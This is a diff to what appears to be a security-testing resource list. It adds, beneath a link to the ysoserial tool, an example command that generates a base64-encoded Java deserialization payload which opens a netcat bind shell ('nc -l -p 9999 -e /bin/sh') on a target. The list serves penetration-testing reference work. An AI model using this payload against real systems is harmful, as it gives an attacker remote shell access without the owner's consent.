@@ -96,6 +96,7 @@ Tools:
 - [webhook site](https://webhook.site/)
 - [ssrftest](https://ssrftest.com)
 - [ysoserial: tool for generating payloads that exploit unsafe Java object deserialization](https://github.com/frohoff/ysoserial)
+example: java -jar ysoserial-0.0.4-all.jar Spring1 "/usr/bin/nc -l -p 9999 -e /bin/sh" | base64
 
 Intigriti Challenges 
 - March 2021 [Intigriti — XSS Challenge 0321 XSS with CSRF Bypass](https://fh4ntke.medium.com/intigriti-xss-challenge-0321-472ae0a48254)
